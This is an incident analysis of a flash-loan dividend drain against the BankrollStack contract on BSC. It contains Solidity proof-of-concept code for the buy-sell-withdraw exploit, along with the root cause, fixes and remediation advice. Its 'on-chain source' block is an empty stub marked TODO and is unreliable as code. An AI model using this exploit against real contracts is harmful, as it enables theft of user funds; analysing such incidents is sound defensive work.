# BankrollStack — Flash Loan Dividend Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-14 |
| **Protocol** | BankrollStack |
| **Chain** | BSC |
| **Loss** | ~5,000 USD |
| **Attacker** | [0x172dca3e72e4643ce8b7932f4947347c1e49ba6d](https://bscscan.com/address/0x172dca3e72e4643ce8b7932f4947347c1e49ba6d) |
| **Attack Tx** | [0x0706425b](https://bscscan.com/tx/0x0706425beba4b3f28d5a8af8be26287aa412d076828ec73d8003445c087af5fd) |
| **Vulnerable Contract** | [0x16d0a151297a0393915239373897bCc955882110](https://bscscan.com/address/0x16d0a151297a0393915239373897bCc955882110) |
| **Root Cause** | Logic flaw in dividend calculation within the buy → sell → withdraw flow where the baseline is immediately finalized |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/BankrollStack_exp.sol) |

---

## 1. Vulnerability Overview

BankrollStack belongs to the same dividend distribution contract family as BankrollNetwork. The attacker borrowed 28,300 BUSD via a PancakeSwap V3 flash loan and executed a full `buy` → `sell` → `withdraw` cycle to drain dividends. The core issue is a calculation flaw that allows profit to be generated through a pure buy-sell cycle alone, without any separate `donatePool` call.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: dividend baseline (payoutsTo) is not immediately finalized at buy time
function buy(uint256 tokenAmount) external returns (uint256) {
    // Mints internal tokens from deposited tokens
    // If profitPerShare is already elevated due to prior donors,
    // the new buyer can retroactively receive past dividends
    uint256 tokens = tokenAmountToTokens(tokenAmount);
    balanceOf[msg.sender] += tokens;
    // payoutsTo is not immediately updated based on the current profitPerShare
}

// ✅ Fix: immediately finalize payoutsTo based on current profitPerShare at buy time
function buy(uint256 tokenAmount) external returns (uint256) {
    uint256 tokens = tokenAmountToTokens(tokenAmount);
    balanceOf[msg.sender] += tokens;
    // Set baseline so new entrants only receive dividends from this point forward
    payoutsTo[msg.sender] += (int256)(profitPerShare * tokens);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: BankrollStack_decompiled.sol
contract BankrollStack {
    function withdraw() external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap V3 Pool: flash(28,300 BUSD)
  │         [pancakeV3FlashCallback callback]
  │
  ├─2─▶ BankrollStack.buy(28,300 BUSD)
  │         └─ Acquire internal tokens (dividend baseline not finalized)
  │
  ├─3─▶ BankrollStack.sell(myTokens())
  │         └─ Sell all internal tokens + accumulate dividends
  │
  ├─4─▶ BankrollStack.withdraw()
  │         └─ Collect inflated dividends
  │
  └─5─▶ PancakeSwap V3 Pool: repay(28,302.83 BUSD) + retain profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    uint256 buyAmount = IERC20(BUSD).balanceOf(address(this)); // 28,300 BUSD
    uint256 repayAmount = 28302830000000000000000; // principal + fee

    // Approve BankrollStack for full amount
    IERC20(BUSD).approve(address(BankrollStack), type(uint256).max);

    // Buy with full amount — triggers dividend baseline vulnerability
    IBankrollStack(BankrollStack).buy(buyAmount);

    // Sell all internal tokens
    uint256 myTokens = IBankrollStack(BankrollStack).myTokens();
    IBankrollStack(BankrollStack).sell(myTokens);

    // Collect inflated dividends (returns more BUSD than principal)
    IBankrollStack(BankrollStack).withdraw();

    // Repay flash loan
    IERC20(BUSD).transfer(address(PancakeV3Pool), repayAmount);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Uninitialized dividend baseline (payoutsTo not set to current profitPerShare at buy time, allowing retroactive application of past dividends) |
| **Attack Vector** | Flash loan + atomic buy-sell-withdraw cycle |
| **Impact** | Protocol liquidity loss |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Immediately finalize entry baseline**: Set `payoutsTo` to `profitPerShare * tokens` at `buy` time
2. **Prohibit same-block buy-sell**: Enforce a minimum holding period of at least 1 block
3. **Flash loan detection**: Block compound buy-sell-withdraw calls within callback functions
4. **Fork audit**: Conduct a full review of all projects based on the same codebase

## 7. Lessons Learned

- BankrollNetwork and BankrollStack share the same code family; a single vulnerability propagates across all derivative projects.
- Dividend distribution contracts must finalize the dividend baseline at the current point in time during `buy`.
- Forked projects do not inherit the audit results of the original, making independent security reviews essential.